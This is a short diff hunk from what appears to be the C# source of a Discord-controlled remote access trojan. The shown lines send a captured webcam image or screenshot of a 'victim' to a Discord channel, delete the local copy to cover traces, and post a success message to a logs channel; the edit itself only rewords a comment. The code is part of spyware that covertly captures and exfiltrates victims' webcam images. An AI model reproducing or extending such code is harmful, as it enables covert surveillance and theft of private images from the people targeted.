@@ -455,7 +455,7 @@ Commands below works only in victim channel
 
             await victimChannel.SendFileAsync(file);
 
-            File.Delete(file); // Then deleting screenshot
+            File.Delete(file); // Then deleting file
 
             await logsChannel.SendMessageAsync($"Successfully getted a webcam of victim '{victimId}' | {userMessage.Author.Mention}");
         }
